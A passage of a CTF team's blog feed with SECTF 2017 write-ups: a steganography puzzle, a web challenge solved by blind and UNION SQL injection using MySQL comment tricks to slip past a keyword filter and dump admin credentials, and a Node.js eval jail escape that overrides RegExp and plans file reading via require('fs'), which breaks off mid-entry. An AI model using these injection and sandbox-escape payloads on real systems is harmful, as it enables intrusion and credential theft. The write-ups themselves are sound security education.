      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="cgi" scheme="https://teamrocketist.github.io/tags/cgi/"/>
    
      <category term="directorylisting" scheme="https://teamrocketist.github.io/tags/directorylisting/"/>
    
  </entry>
  
  <entry>
    <title>[Misc] SECTF - Joeys screenshot</title>
    <link href="https://teamrocketist.github.io/2017/09/15/Misc-SECTF-Joeys-screenshot/"/>
    <id>https://teamrocketist.github.io/2017/09/15/Misc-SECTF-Joeys-screenshot/</id>
    <published>2017-09-15T19:17:28.000Z</published>
    <updated>2017-09-15T19:32:12.930Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>Joeys screenshot - Misc (50 + 0)<br><br>Joey gave me this screenshot to prove he got into The Gibson. Can you help us hack The Gibson too?<br><br>Solves: 69<br><br>Download: <a href="http://dl.ctf.rocks/joey.tar.gz" target="_blank" rel="external">http://dl.ctf.rocks/joey.tar.gz</a><br><br>Author: SecureLink / klondike<br><br></blockquote>

<p>Pretty simple one, this image had some strange hidden comments, I extracted them using <a href="https://github.com/zed-0xff/zsteg" target="_blank" rel="external">https://github.com/zed-0xff/zsteg</a>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div></pre></td><td class="code"><pre><div class="line">$ zsteg chall.png</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 33 36                                          |_36             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 33 32 37                                          |327             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 43 32                                             |C2              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 31 33 34                                          |134             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 35 32 34                                          |524             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 4e 32 32                                          |N22             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 48 34 31                                          |H41             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 7b 34                                             |&#123;4              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 31 31                                          |_11             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 33 33                                          |_33             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 31 33                                          |_13             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 30 32 31                                          |021             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 45 31                                             |E1              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 35 33 30                                          |530             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 33 34 32                                          |342             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 48 34 33                                          |H43             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 30 33 38                                          |038             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 35 33 35                                          |535             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 50 32 36                                          |P26             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 55 32 35                                          |U25             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 47 33 37                                          |G37             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 34 31 35                                          |415             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 33 39                                             |39              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 42 31 39                                          |B19             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 53 30                                             |S0              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 55 32 39                                          |U29             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 52 32 38                                          |R28             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 52 33 32                                          |R32             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 44 31 34                                          |D14             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 32 31 32                                          |212             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 32 33                                          |_23             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 44 35                                             |D5              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 44 33 39                                          |D39             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 34 30                                          |_40             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 47 31 37                                          |G17             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 4b 38                                             |K8              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 59 31 30                                          |Y10             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 33 34 34                                          |344             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 21 34 35                                          |!45             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 35 32 30                                          |520             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 54 33                                             |T3              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 33 33 31                                          |331             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 31 31 38                                          |118             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 34 36                                             |46              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 7d 34 36                                          |&#125;46             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 31 36                                          |_16             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 37                                             |_7              |</div></pre></td></tr></table></figure>
<p>After extracting them into a file I noticed the pattern behind it! if we get some comments we can see something familiar!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">S0</div><div class="line">E1</div><div class="line">C2</div><div class="line">T3</div><div class="line">&#123;4</div></pre></td></tr></table></figure>
<p>Yes! the first letter is a character from the flag and the order is the number after it! so lets write a python script to parse this and construct the flag!</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">d = &#123;&#125;</div><div class="line">flag = <span class="string">''</span></div><div class="line"><span class="keyword">with</span> open(<span class="string">'notes.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">	l = f.read().split()</div><div class="line">	<span class="keyword">for</span> s <span class="keyword">in</span> l:</div><div class="line">		d[s[<span class="number">1</span>:]] = s[<span class="number">0</span>]</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">47</span>):</div><div class="line">	flag += d[str(x)]</div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure>
<p>A now running it</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python misc50.py </div><div class="line">SECT&#123;D4_K3Y_2_D4_G1B50N_5UP3RU53R_15_G0D_H3H3!&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;Joeys screenshot - Misc (50 + 0)&lt;br&gt;&lt;br&gt;Joey gave me this screenshot to prove he got into The Gibson. Can you help us ha
    
    </summary>
    
      <category term="Misc" scheme="https://teamrocketist.github.io/categories/Misc/"/>
    
    
      <category term="misc" scheme="https://teamrocketist.github.io/tags/misc/"/>
    
      <category term="stego" scheme="https://teamrocketist.github.io/tags/stego/"/>
    
      <category term="zsteg" scheme="https://teamrocketist.github.io/tags/zsteg/"/>
    
      <category term="comments" scheme="https://teamrocketist.github.io/tags/comments/"/>
    
      <category term="puzzle" scheme="https://teamrocketist.github.io/tags/puzzle/"/>
    
  </entry>
  
  <entry>
    <title>[Web] SECTF - naughtyads</title>
    <link href="https://teamrocketist.github.io/2017/09/15/Web-SECTF-naughtyads/"/>
    <id>https://teamrocketist.github.io/2017/09/15/Web-SECTF-naughtyads/</id>
    <published>2017-09-15T16:10:27.000Z</published>
    <updated>2017-09-15T16:47:39.463Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>Naughty ads - Web (200 + 0)<br><br>Can you put agent Gill in the naughty ad section? His phone number is “555-31338”<br><br>Solves: 122<br><br>Service: <a href="http://naughtyads.alieni.se/" target="_blank" rel="external">http://naughtyads.alieni.se/</a><br><br>Author: avlidienbrunn<br><br></blockquote>

<p>Checking in robots.txt we have a hidden directory called admin, but there is a http authentication and we don’t know the user and the password, we need to find a vulnerability to get the credentials.</p>
<h3 id="Finding-the-vulnerability"><a href="#Finding-the-vulnerability" class="headerlink" title="Finding the vulnerability"></a>Finding the vulnerability</h3><p>Another Sql injection after some searching I found a GET param vulnerable to blind SQLi</p>
<p>Successful query that returns content :</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='A</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/55vYxqN.png" alt=""></p>
<p>Unsuccessful query that returns nothing :</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='B</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/exBhKMF.png" alt=""></p>
<hr>
<h3 id="Bypassing-filters"><a href="#Bypassing-filters" class="headerlink" title="Bypassing filters"></a>Bypassing filters</h3><p>Now there is some kind of protection, there is a filter blacklisting alot of SQL words, one way of bypassing it is by doing this:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">// bypasses or filter</div><div class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' <span class="comment">/*!50000or*/</span> 1 AND 'A'='A</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/5iPiplZ.png" alt=""></p>
<h3 id="Performing-Union-Injections"><a href="#Performing-Union-Injections" class="headerlink" title="Performing Union Injections"></a>Performing Union Injections</h3><p>Getting Table names:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se/?id=3ad3-46c3-b97' <span class="comment">/*!50000union*/</span> <span class="comment">/*!50000all*/</span> <span class="comment">/*!50000select*/</span> group_concat(table_name) <span class="comment">/*!50000from*/</span> information_schema.tables <span class="comment">/*!50000where*/</span> table_schema=database() AND '1'='1</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/rL6GHpT.png" alt=""></p>
<p>Getting Columns names:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se/?id=3ad3-46c3-b97' <span class="comment">/*!50000union*/</span> <span class="comment">/*!50000all*/</span> <span class="comment">/*!50000select*/</span> group_concat(column_name) <span class="comment">/*!50000from*/</span> information_schema.columns <span class="comment">/*!50000where*/</span> table_schema=database() AND '1'='1</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/LHkGiYk.png" alt=""></p>
<p>Getting the Username and password</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se/?id=3ad3-46c3-b97' <span class="comment">/*!50000union*/</span> <span class="comment">/*!50000all*/</span> <span class="comment">/*!50000select*/</span> group_concat(name, " ", password) <span class="comment">/*!50000from*/</span> login <span class="comment">/*!50000where*/</span> '1'='1</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/i72v18w.png" alt=""></p>
<p>After searching in google the hash 5ebe2294ecd0e0f08eab7690d2a6ee69 is secret</p>
<hr>
<h3 id="Admin-Login"><a href="#Admin-Login" class="headerlink" title="Admin Login"></a>Admin Login</h3><p>We have a simple form with a image upload well if we remember the challenge description:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Can you put agent Gill in the naughty ad section? His phone number is &quot;555-31338&quot;</div></pre></td></tr></table></figure>
<p>So lets put the number and submit the form:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://naughtyads.alieni.se/admin/'</span> --user webmasterofdoom3755:secret --data <span class="string">'phone=555-31338'</span></div><div class="line">SECT&#123;~tr4nsv3stiT3s_w3lc0me_t00~&#125;</div></pre></td></tr></table></figure>
<p>And we got the flag!!!</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;Naughty ads - Web (200 + 0)&lt;br&gt;&lt;br&gt;Can you put agent Gill in the naughty ad section? His phone number is “555-31338”&lt;br&gt;
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="filterbypass" scheme="https://teamrocketist.github.io/tags/filterbypass/"/>
    
      <category term="blindsqli" scheme="https://teamrocketist.github.io/tags/blindsqli/"/>
    
      <category term="sqlinjection" scheme="https://teamrocketist.github.io/tags/sqlinjection/"/>
    
      <category term="httpauth" scheme="https://teamrocketist.github.io/tags/httpauth/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] SECTF - Jail 1</title>
    <link href="https://teamrocketist.github.io/2017/09/15/Pwn-SECTF-Jail-1/"/>
    <id>https://teamrocketist.github.io/2017/09/15/Pwn-SECTF-Jail-1/</id>
    <published>2017-09-15T15:08:51.000Z</published>
    <updated>2017-09-15T18:26:44.857Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>Jail - Pwn (200 + 0)<br><br>Joey gave you the disk with the file on it and now you’re in jail. They’re charging you with some serious shit, man! Better figure out a way to escape.<br><br>Solves: 43<br><br>Service: jail.alieni.se:55542<br><br>Author: avlidienbrunn<br><br></blockquote>

<p>A jail escape challenge this time with javascript we need, we can start by sending <code>this</code> so we can view the source code of the current function running:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _<span class="string">'_´|||  ||</span></div><div class="line"><span class="string">     ||   || o o ||   ||</span></div><div class="line"><span class="string">     ||  (||  - ´||)  ||</span></div><div class="line"><span class="string">     ||   ||  =  ||   ||</span></div><div class="line"><span class="string">     ||   ||\___/||   ||</span></div><div class="line"><span class="string">     ||___||) , (||___||</span></div><div class="line"><span class="string">    /||---||-\_/-||---||\</span></div><div class="line"><span class="string">   / ||--_||_____||_--|| \ </span></div><div class="line"><span class="string">  (_(||)-|S555-4202|-(||)_)</span></div><div class="line"><span class="string">|"""""""""""""""""""""""""""|</span></div><div class="line"><span class="string">| "You get one call, UNO."  |</span></div><div class="line"><span class="string"> """"""""""""""""""""""""""""</span></div><div class="line"><span class="string"> Phone #&gt; this</span></div></pre></td></tr></table></figure>
<p>And we get this source code:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params">number</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> hangup = process.exit;</div><div class="line">        <span class="keyword">var</span> line = <span class="string">""</span>;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(number == <span class="number">911</span>)&#123;</div><div class="line">            <span class="built_in">console</span>.log(<span class="string">"Invalid number"</span>);</div><div class="line">            ask();</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">var</span> flag,<span class="built_in">Array</span>,<span class="built_in">Boolean</span>,<span class="built_in">Date</span>,global,<span class="built_in">Error</span>,<span class="built_in">EvalError</span>,<span class="built_in">Function</span>,<span class="built_in">Number</span>,<span class="built_in">Object</span>,<span class="built_in">RangeError</span>,<span class="built_in">ReferenceError</span>,<span class="built_in">String</span>,<span class="built_in">SyntaxError</span>,<span class="built_in">TypeError</span>,<span class="built_in">URIError</span>,<span class="built_in">decodeURI</span>,<span class="built_in">decodeURIComponent</span>,<span class="built_in">encodeURI</span>,<span class="built_in">encodeURIComponent</span>,<span class="built_in">isFinite</span>,<span class="built_in">isNaN</span>,<span class="built_in">parseFloat</span>,<span class="built_in">parseInt</span>,<span class="built_in">ArrayBuffer</span>,Buffer,DTRACE_HTTP_CLIENT_REQUEST,DTRACE_HTTP_CLIENT_RESPONSE,DTRACE_HTTP_SERVER_REQUEST,DTRACE_HTTP_SERVER_RESPONSE,DTRACE_NET_SERVER_CONNECTION,DTRACE_NET_STREAM_END,<span class="built_in">DataView</span>,<span class="built_in">Float32Array</span>,<span class="built_in">Float64Array</span>,<span class="built_in">Int16Array</span>,<span class="built_in">Int32Array</span>,<span class="built_in">Int8Array</span>,<span class="built_in">Map</span>,<span class="built_in">Promise</span>,<span class="built_in">Proxy</span>,<span class="built_in">Set</span>,<span class="built_in">Symbol</span>,<span class="built_in">Uint16Array</span>,<span class="built_in">Uint32Array</span>,<span class="built_in">Uint8Array</span>,<span class="built_in">Uint8ClampedArray</span>,<span class="built_in">WeakMap</span>,<span class="built_in">WeakSet</span>,assert,clearImmediate,clearInterval,clearTimeout,<span class="built_in">escape</span>,events,<span class="built_in">require</span>,setImmediate,setInterval,setTimeout,stream,<span class="built_in">unescape</span>,__defineGetter__,__defineSetter__,__lookupGetter__,__lookupSetter__,<span class="keyword">constructor</span>,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf;</div><div class="line"></div><div class="line">        if(new RegExp(/[\[\]\.\\]/).test(number))&#123;</div><div class="line">            <span class="built_in">console</span>.log(<span class="string">"Dangerous characters detected"</span>);</div><div class="line">            hangup();</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">arguments</span> = <span class="literal">undefined</span>;</div><div class="line"></div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"Calling "</span>+<span class="built_in">eval</span>(number)+<span class="string">"... Nobody picks up!"</span>);</div><div class="line">        hangup();</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>We can see after we send our <code>number</code> the program will end, at the begin of the function we can see the hangup function is being set into <code>process.exit</code>. We have an interesting feature too if we try to call 911 we will jump into <code>ask</code> function:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _<span class="string">'_´|||  ||</span></div><div class="line"><span class="string">     ||   || o o ||   ||</span></div><div class="line"><span class="string">     ||  (||  - ´||)  ||</span></div><div class="line"><span class="string">     ||   ||  =  ||   ||</span></div><div class="line"><span class="string">     ||   ||\___/||   ||</span></div><div class="line"><span class="string">     ||___||) , (||___||</span></div><div class="line"><span class="string">    /||---||-\_/-||---||\</span></div><div class="line"><span class="string">   / ||--_||_____||_--|| \ </span></div><div class="line"><span class="string">  (_(||)-|S555-4202|-(||)_)</span></div><div class="line"><span class="string">|"""""""""""""""""""""""""""|</span></div><div class="line"><span class="string">| "You get one call, UNO."  |</span></div><div class="line"><span class="string"> """""""""""""""""""""""""""</span></div><div class="line"><span class="string"> Phone #&gt; ask</span></div></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">ask</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    rl.question(template,<span class="function"><span class="keyword">function</span>(<span class="params">answer</span>)</span>&#123;</div><div class="line">        Jail.call(answer);</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>As we can see the function ask is restarting the program this will come handy later, we have some restriction too RegexExp class is blocking ‘.’, ‘[‘, ‘]’ and ‘\‘ characters:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/[\[\]\.\\]/</span>).test(number))&#123;</div><div class="line">   <span class="built_in">console</span>.log(<span class="string">"Dangerous characters detected"</span>);</div><div class="line">   hangup();</div><div class="line">   <span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>So how do can we bypass this? my plan was:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1 - Override RegexExp class to always return true.</div><div class="line">2 - Recall function call but this time with 911 number(this will restart the program and a this point RegexExp returns always false so we can inject any character we want).</div><div class="line">3 - Get the current filename.</div><div class="line">4 - Use process.mainModule.require(&apos;fs&apos;).readFileSync(filename) to read the file and get the flag!</div></pre></td></tr></table></figure>
<h3 id="Override-RegexExp"><a href="#Override-RegexExp" class="headerlink" title="Override RegexExp"></a>Override RegexExp</h3><p>To override the RegexExp class we can just do this:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hangup = <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123; <span class="built_in">RegExp</span> = <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">RegExp</span> </span>&#123; test() &#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;&#125;; call(<span class="number">911</span>);&#125;</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _<span class="string">'_´|||  ||</span></div><div class="line"><span class="string">     ||   || o o ||   ||</span></div><div class="line"><span class="string">     ||  (||  - ´||)  ||</span></div><div class="line"><span class="string">     ||   ||  =  ||   ||</span></div><div class="line"><span class="string">     ||   ||\___/||   ||</span></div><div class="line"><span class="string">     ||___||) , (||___||</span></div><div class="line"><span class="string">    /||---||-\_/-||---||\</span></div><div class="line"><span class="string">   / ||--_||_____||_--|| \ </span></div><div class="line"><span class="string">  (_(||)-|S555-4202|-(||)_)</span></div><div class="line"><span class="string">|"""""""""""""""""""""""""""|</span></div><div class="line"><span class="string">| "You get one call, UNO."  |</span></div><div class="line"><span class="string"> """""""""""""""""""""""""""</span></div><div class="line"><span class="string"> Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;</span></div><div class="line"><span class="string">Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!</span></div><div class="line"><span class="string">Invalid number</span></div><div class="line"><span class="string">_____________________________</span></div><div class="line"><span class="string">     ||   ||     ||   ||</span></div><div class="line"><span class="string">     ||   ||, , ,||   ||</span></div><div class="line"><span class="string">     ||  (||/|/(/||/  ||</span></div><div class="line"><span class="string">     ||  ||| _'</span>_´|||  ||</div><div class="line">     ||   || o o ||   ||</div><div class="line">     ||  (||  - ´||)  ||</div><div class="line">     ||   ||  =  ||   ||</div><div class="line">     ||   ||\___/||   ||</div><div class="line">     ||___||) , (||___||</div><div class="line">    /||---||-\_/-||---||\</div><div class="line">   / ||--_||_____||_--|| \ </div><div class="line">  (_(||)-|S555-4202|-(||)_)</div><div class="line">|<span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">"|</span></div><div class="line"><span class="string">| "</span>You get one call, UNO.<span class="string">"  |</span></div><div class="line"><span class="string"> "</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span></div><div class="line"> Phone <span class="comment">#&gt;</span></div></pre></td></tr></table></figure>
